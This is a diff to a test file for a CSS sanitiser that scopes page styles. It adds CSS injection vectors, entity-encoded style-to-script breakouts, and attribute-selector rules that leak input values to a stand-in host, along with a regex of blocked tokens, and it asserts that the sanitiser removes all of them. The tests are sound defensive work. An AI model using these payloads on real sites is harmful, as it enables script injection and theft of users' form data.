@@ -8,6 +8,7 @@ import { applyLabels } from '../src/decorations/labels.js';
 import { buildModel } from '../src/model.js';
 import {
   calcArgsSafe,
+  carriedStyleRules,
   carryStaticStyle,
   cleanStyle,
   droppedStyleRules,
@@ -106,6 +107,7 @@ const VECTORS: Array<[string, string, string | null, string[]]> = [
   ['fullwidth digit in calc()', 'width:calc(\uFF11px)', null, ['width']],
   ['scientific notation in calc()', 'width:calc(1e3px)', null, ['width']],
   ['calc breakout after a semicolon', 'width:calc(1px + 2px);}body{background:red', 'width:calc(1px + 2px)', ['?']],
+  ['brace breakout in a value without a semicolon', 'width:1px}body{background:red', null, ['width']],
   ['newline-joined image-set', 'color:red\nbackground:image-set("https://example.test/x" 1x)', null, ['color']],
   ['escaped property name', 'w\\69dth:1px', null, ['?']],
   ['escaped behavior', 'b\\65havior:url(x.htc)', null, ['?']],
@@ -301,7 +303,7 @@ test('dangerous properties in <style> rules continue to be rejected and incremen
   }
 });
 
-test('@keyframes rules carry and rule with partial unsafe declarations keeps safe ones', () => {
+test('@keyframes rules carry and rule with partial unsafe declarations keeps safe ones while counting the dropped declaration', () => {
   const css = `
     @keyframes slideInFromLeft {
       0% { transform: translateX(-100%); }
@@ -315,11 +317,106 @@ test('@keyframes rules carry and rule with partial unsafe declarations keeps saf
     }
   `;
   const result = carryStaticStyle(css, '[data-page="Home"]');
-  assert.equal(result.droppedRules, 0);
+  assert.equal(result.droppedRules, 1);
   assert.equal(
     result.css,
-    '@keyframes slideInFromLeft{0%{transform: translateX(-100%)}100%{transform: translateX(0)}}\n[data-page="Home"] .back{background-repeat: none;background-position: 50% 40%;background-size: 130px}',
+    '@keyframes c2c-data-page-Home-slideInFromLeft{0%{transform: translateX(-100%)}100%{transform: translateX(0)}}\n[data-page="Home"] .back{background-repeat: none;background-position: 50% 40%;background-size: 130px}',
   );
+});
+
+test('nested-brace shapes in rule and keyframe bodies are dropped whole so selectors cannot escape page scope', () => {
+  const mustDrop = [
+    '.a{ j{; x:red} body{background:red}}',
+    '.a{ q:expression{; x:red} *{display:none}}',
+    '@keyframes k{0%{ j{; x:red} body{background:red}}}',
+    '.a{ color:red; { background:blue } }',
+    '.a{ color:red} body{display:none} .b{color:green}',
+  ];
+  for (const css of mustDrop.slice(0, 4)) {
+    const res = carryStaticStyle(css, '[data-page="Home"]');
+    assert.equal(res.css, '', `expected empty css for: ${css}`);
+    assert.equal(res.droppedRules, 1, `expected 1 dropped rule for: ${css}`);
+  }
+});
+
+test('built-in c2c-* @keyframes names are refused and counted as dropped, and partial @keyframes stop drops are counted', () => {
+  for (const name of ['c2c-pulse', 'c2c-row-in', 'C2C-Custom']) {
+    const res = carryStaticStyle(`@keyframes ${name} { 0% { opacity: 0 } 100% { opacity: 1 } }`, '[data-page="Home"]');
+    assert.equal(res.css, '', `expected ${name} to be refused`);
+    assert.equal(res.droppedRules, 1, `expected ${name} to count as dropped`);
+  }
+  const webkitRes = carryStaticStyle('@-webkit-keyframes c2c-pulse { 50% { opacity: 0.45 } }', '[data-page="Home"]');
+  assert.equal(webkitRes.css, '');
+  assert.equal(webkitRes.droppedRules, 1);
+
+  const partialKf = carryStaticStyle(
+    '@keyframes fade { 0% { background: url(//x.test/a); opacity: 0 } 100% { opacity: 1 } }',
+    '[data-page="Home"]',
+  );
+  assert.equal(partialKf.css, '@keyframes c2c-data-page-Home-fade{0%{opacity: 0}100%{opacity: 1}}');
+  assert.equal(partialKf.droppedRules, 1);
+});
+
+test('static <style> attack vectors never emit dangerous tokens or unscoped selectors', () => {
+  const scope = '[data-page="Home"]';
+  type CssRule = { selectorText?: string; cssRules?: CssRule[] };
+  const selectors = (css: string): string[] => {
+    const dom = new JSDOM(`<!doctype html><style>${css.replace(/</g, '')}</style>`);
+    const out: string[] = [];
+    const walk = (rules: CssRule[]) => {
+      for (const r of rules) {
+        if (r.selectorText !== undefined) out.push(r.selectorText);
+        if (r.cssRules) walk(r.cssRules);
+      }
+    };
+    const sheets = (dom.window.document as unknown as { styleSheets: Array<{ cssRules: CssRule[] }> }).styleSheets;
+    walk(sheets[0]!.cssRules);
+    return out;
+  };
+  const unscoped = (css: string) => selectors(css).filter((s) => s.split(',').some((p) => !p.trim().startsWith(scope)));
+  const bad = (css: string) => /url\s*\(|image-set|expression|javascript:|behavior|-moz-binding|@import|@font-face|<|\\/i.test(css);
+  const viaStyle = (body: string) => carriedStyleRules(`<div><style>${body}</style></div>`, scope);
+
+  const cases: Record<string, string> = {
+    'ent url': '.a{background:&#x75;rl(//x.test/a)}',
+    'ent url dbl': '.a{background:&amp;#x75;rl(//x.test/a)}',
+    'ent breakout': '.a{color:red}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
+    'ent breakout in value': '.a{color:red&lt;/style&gt;&lt;script&gt;alert(1)}',
+    'ent colon js': '.a{background:javascript&#58;alert(1)}',
+    'ent expression': '.a{width:expr&#x65;ssion(alert(1))}',
+    'url': '.a{color:red;background:url(//x.test/a)}',
+    'image-set': '.a{background-image:image-set("//x.test/a" 1x)}',
+    '@import': '@import url(//x.test/a.css); .a{color:red}',
+    '@import str': '@import "//x.test/a.css"; .a{color:red}',
+    '@font-face': '@font-face{font-family:x;src:url(//x.test/f)} .a{color:red}',
+    'behavior': '.a{behavior:url(x.htc)}',
+    'moz-binding': '.a{-moz-binding:url(x.xml#y)}',
+    'expression': '.a{width:expression(alert(1))}',
+    'kf url': '@keyframes k{0%{background:url(//x.test/a)}100%{color:red}}',
+    'kf name injection': '@keyframes k{0%{color:red}} @keyframes x\\{ {0%{color:red}}',
+    'kf head url': '@keyframes k{url(//x.test/a){color:red}}',
+    'font shorthand url': ".a{font:12px 'A', url(//x.test/f)}",
+    'font shorthand quote escape': ".a{font:12px 'A\\'), url(//x.test/f)'}",
+    'css escape url': '.a{background:u\\72 l(//x.test/a)}',
+    'line comment hide': '.a{color:red//}; background:url(x)\n}',
+    'line comment hide2': '.a{color:red;//\nbackground:url(x)}',
+    'line comment brace': '.a{ // {\n x:red} body{background:red}}',
+    'recover root': 'color:red; :root{color:red}',
+    'recover html/body/*': 'x;html, body, *{color:red}',
+    'recover sibling': 'x; ~ header{display:none}',
+    'junk brace escape': '.a{ j{; x:red} body{background:red}}',
+    'unsafe-decl brace escape': '.a{ q:expression{; x:red} *{display:none}}',
+    'kf brace escape': '@keyframes k{0%{ j{; x:red} body{background:red}}}',
+    'attr exfil': 'input[value^=a]{background:url(//x.test/a)}',
+    'attr exfil mixed': 'input[value^=a]{color:red;background-image:url(//x.test/a)}',
+    'attr exfil image-set': 'input[value^=a]{color:red;background-image:image-set(url(//x.test/a) 1x)}',
+  };
+  for (const [name, css] of Object.entries(cases)) {
+    for (const [how, r] of [['carry', carryStaticStyle(css, scope)], ['dom', viaStyle(css)]] as const) {
+      assert.ok(!bad(r.css), `${name} [${how}] dangerous token survived: ${r.css}`);
+      assert.deepEqual(unscoped(r.css), [], `${name} [${how}] unscoped selector emitted: ${r.css}`);
+    }
+  }
 });
 
 test('the rendered <style> keeps child combinators', async () => {
